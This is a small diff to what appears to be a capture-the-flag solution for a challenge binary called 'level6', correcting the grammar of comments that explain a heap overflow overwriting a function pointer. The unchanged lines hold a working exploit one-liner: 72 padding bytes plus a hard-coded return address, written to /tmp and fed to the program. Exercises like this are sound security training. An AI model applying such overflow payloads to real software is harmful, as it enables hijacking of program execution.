@@ -1,6 +1,6 @@
-# There is two coadjacent malloced chunks.
+# There are two coadjacent malloced chunks.
 # We overflow the malloced chunck with our target to overwrite the previous data inside the next chunk.
-# This previous data should have been called as a function soon after the copy. Instead, that the function with the critical function which is called.
+# This previous data is called as a function soon after the copy. Instead, that's the function with the critical behavior which is called.
 
 python -c 'print "A"*72 + "\x54\x84\x04\x08"' | tr -d "\n" > /tmp/payload_level6
 ./level6 `cat /tmp/payload_level6`
